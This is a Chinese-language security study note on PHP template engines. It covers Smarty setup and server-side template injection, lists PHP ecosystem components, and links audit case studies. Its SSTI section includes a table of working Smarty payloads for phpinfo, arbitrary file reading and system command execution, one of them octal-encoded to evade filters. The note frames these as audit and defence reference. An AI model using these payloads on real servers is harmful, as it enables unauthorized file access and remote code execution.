# PHP 生态组件与模板引擎安全笔记

## 一、模板引擎基础

### 1. 概念
模板引擎是为了让**前端界面（HTML）**与**后端程序代码（PHP）**分离而产生的解决方案 —— HTML 文件中不再需要写 PHP 代码。

以 Smarty 为例，原理是**变量替换**：在 HTML/模板文件中写好 Smarty 标签（如 `{name}`），再通过 Smarty 的方法向模板传递变量参数，由引擎完成渲染替换。

### 2. 各语言生态中的模板框架

| 语言 | 常见模板框架 |
|---|---|
| PHP | Smarty、Twig、CodeIgniter 自带模板等 |
| Python | Jinja2、Mako、Tornado、Django 模板 |
| Java | Thymeleaf、Jade、Velocity、FreeMarker |
| JavaScript | doT、Nunjucks、Pug、Marko、EJS、Dust |

### 3. 核心安全风险：SSTI
模板引擎最核心的安全问题是 **SSTI（Server-Side Template Injection，服务器端模板注入）**：当用户可控输入未经过滤直接拼接进模板内容（而非作为变量赋值传入），模板引擎在渲染阶段会将其当作模板语法解析执行，可能导致任意文件读取甚至远程代码执行（RCE）。

---

## 二、Smarty 实战与 SSTI

### 1. 安装使用
下载地址：https://github.com/smarty-php/smarty/releases

**基本使用步骤**：
1. 新建文件夹 `smarty-demo`，下载对应版本 Smarty 并解压至该目录。
2. 创建 `index.php`：

```php
<?php
// 引入 Smarty 类文件
require('smarty-demo/libs/Smarty.class.php');
// 创建 Smarty 实例
$smarty = new Smarty;
// 设置 Smarty 相关属性
$smarty->template_dir = 'smarty-demo/templates/';
$smarty->compile_dir  = 'smarty-demo/templates_c/';
$smarty->cache_dir    = 'smarty-demo/cache/';
$smarty->config_dir   = 'smarty-demo/configs/';
// 赋值变量到模板中
$smarty->assign('title', '欢迎使用 Smarty');
// 显示模板
$smarty->display('index.tpl');
?>
```

3. 创建模板文件 `index.tpl`：

```html
<!DOCTYPE html>
<html>
<head>
<title>{$title}</title>
</head>
<body>
<h1>{$title}</h1>
<p>这是一个使用 Smarty 的例子。</p>
</body>
</html>
```

### 2. SSTI 成因：渲染文件受控
当应用把**用户可控的字符串**直接传给 `$smarty->display()` / `fetch()` 等渲染方法（而不是把用户输入作为变量通过 `assign()` 传入），攻击者就能注入 Smarty 模板语法，触发任意代码执行。

**常见 Payload 示例（原理参考，仅用于理解漏洞成因与审计判断）**：

| 用途 | Payload |
|---|---|
| 执行 `phpinfo()` | `*/phpinfo();//` |
| 读取任意文件 | `string:{include file='C:/Windows/win.ini'}` |
| 定义函数并执行系统命令 | `string:{function name='x(){};system(whoami);function '}{/function}` |
| 通过内部对象链式调用渲染字符串模板 | `string:{$smarty.template_object->smarty->_getSmartyObj()->display('string:{system(whoami)}')}` |
| 利用 `math` 标签 + 八进制编码绕过过滤执行命令 | `eval:{math equation='("\163\171\163\164\145\155")("\167\150\157\141\155\151")'}` |

> 审计要点：凡是看到"用户输入 → 直接拼接进模板渲染内容/渲染方法参数"的代码路径，都应重点排查是否存在 SSTI。防御核心是**严格区分"模板内容"与"模板变量"**，用户输入只应作为变量通过 `assign()` 传递，绝不能作为模板字符串本身被渲染。

### 3. CVE 与案例参考
- https://xz.aliyun.com/t/11108
- https://www.cnblogs.com/magic-zero/p/8351974.html

---

## 三、PHP 生态常用组件/框架一览

> 这些组件本身不是漏洞，但在代码审计中非常重要：很多 CMS/Web 应用的高危漏洞根源并不在自身代码，而在于**引用的第三方组件版本过旧或使用方式不当**（见本节末尾案例）。审计时应养成识别项目依赖了哪些组件、核对对应版本是否存在已知 CVE 的习惯。

### 1. Web 框架
| 组件 | 说明 |
|---|---|
| Laravel | 现代化、功能全面，适合大多数 Web 应用 |
| Symfony | 高度模块化，适合复杂应用 |
| CodeIgniter | 轻量级，适合快速开发 |
| Zend Framework (Laminas) | 企业级，高扩展性和性能 |
| Yii | 高性能，适合快速开发和大规模应用 |

### 2. 数据库组件
| 组件 | 说明 |
|---|---|
| Doctrine ORM | 支持复杂查询和映射 |
| Eloquent ORM | Laravel 内置 ORM |
| PDO | PHP 数据库抽象层，支持多种数据库引擎 |
| RedBeanPHP | 轻量级 ORM，自动创建/管理数据库表 |

### 3. 模板引擎
| 组件 | 说明 |
|---|---|
| Twig | Symfony 项目常用，灵活现代 |
| Blade | Laravel 内置，支持模板继承 |
| Smarty | 经典模板引擎，适合中大型项目 |
| Mustache | 轻量级跨语言模板引擎 |

### 4. 路由组件
| 组件 | 说明 |
|---|---|
| FastRoute | 高性能，适合小型应用和 API |
| AltoRouter | 轻量级，易配置 |
| Symfony Routing | 适合复杂应用 |

### 5. 认证与授权
| 组件 | 说明 |
|---|---|
| OAuth2 Server PHP | 实现 OAuth2 协议，适用于 API 认证 |
| JWT | 轻量级身份验证方案 |
| PHP-Auth | 简单用户认证库，中小型应用 |

### 6. 支付集成
| 组件 | 说明 |
|---|---|
| Stripe PHP SDK | 信用卡支付、订阅等 |
| PayPal SDK for PHP | 支付、退款等 |

### 7. 邮件发送
| 组件 | 说明 |
|---|---|
| PHPMailer | 功能强大，支持 SMTP/POP3 |
| SwiftMailer | 支持多种邮件功能 |
| Mailgun PHP SDK | Mailgun 官方 SDK |

### 8. 文件管理
| 组件 | 说明 |
|---|---|
| Flysystem | 文件存储抽象层，支持本地/S3/FTP 等 |
| Symfony Filesystem | 简单文件操作 API |
| Intervention Image | 裁剪、缩放、水印等图片处理 |

### 9. 缓存与性能
| 组件 | 说明 |
|---|---|
| Redis | 内存存储，缓存/消息队列 |
| Memcached | 高并发缓存 |
| Symfony Cache | 支持多种缓存后端 |
| Laravel Cache | Laravel 内置 |

### 10. 日志管理
| 组件 | 说明 |
|---|---|
| Monolog | 支持文件/数据库/邮件等多渠道日志 |
| Log4PHP | Log4j 的 PHP 实现 |

### 11. 任务队列
| 组件 | 说明 |
|---|---|
| Laravel Queue | 延迟任务、异步处理 |
| Resque | 基于 Redis 的任务队列 |
| RabbitMQ | 消息代理服务，任务调度与消息传递 |

### 12. WebSocket 与实时通信
| 组件 | 说明 |
|---|---|
| Ratchet | 在线聊天、实时通信 |
| Swoole | 高性能协程框架，支持 WebSocket/TCP/UDP，适合高并发 |

### 13. 测试与调试
| 组件 | 说明 |
|---|---|
| PHPUnit | 标准单元测试框架 |
| Xdebug | 堆栈跟踪、性能分析、断点调试 |

### 14. 富文本编辑器
| 组件 | 说明 |
|---|---|
| KindEditor | 轻量级，支持图片上传、插入视频 |
| TinyMCE | 开源，插件丰富 |
| CKEditor | 高度可定制 |
| Froala Editor | 轻量现代，支持图像/视频嵌入 |
| Quill | 轻量强大，适合单页应用 |
| Summernote | 基于 jQuery，适合中小型项目 |
| Trumbowyg | 轻量级，基本功能 |
| Redactor | 功能丰富，支持多种上传 |

### 15. 图片上传组件
| 组件 | 说明 |
|---|---|
| Dropzone.js | 拖拽/多文件上传 |
| FilePond | 高度可定制，支持预览/验证/进度 |
| Fine Uploader | 多种上传方式 |
| Plupload | 支持 HTML5 和 Flash，可与 PHP 后台集成 |

### 16. 图片处理组件
| 组件 | 说明 |
|---|---|
| ImageMagick | 格式转换、裁剪、旋转、水印等 |
| GD Library | PHP 内置图像处理库 |
| Intervention Image | 易于与 Laravel 集成 |

---

## 四、代码审计案例：第三方组件引入的安全问题

两个案例共同点：**核心漏洞并非系统主体代码的逻辑缺陷，而是由所引用/集成的第三方组件（插件、编辑器等）版本过旧或存在已知漏洞导致**，审计这类系统时必须核对所有引入的第三方依赖版本。

### 1. 网钛 OTCMS
- 参考：https://xz.aliyun.com/t/13432

### 2. KindEditor（富文本编辑器）
- 参考：https://www.cnblogs.com/TaoLeonis/p/14899198.html

### 3. 插件/组件使用与补充参考
- https://www.cnblogs.com/qq350760546/p/6669112.html
- https://www.cnblogs.com/linglinglingling/p/18040866
- https://blog.csdn.net/weixin_58099903/article/details/125810825

---

## 五、总结

1. 模板引擎的核心价值是前后端分离，但一旦用户输入被当作"模板本身"而非"模板变量"处理，就会产生 SSTI，严重时可直接 RCE。
2. PHP 生态中组件选择多样（ORM、路由、认证、缓存、编辑器、上传组件等），代码审计时应将"项目引用了哪些第三方组件及其版本"作为必查项，很多 CMS 高危漏洞的真正源头在第三方依赖，而非自身业务代码。
[[05 框架开发与代码审计笔记（TP）]]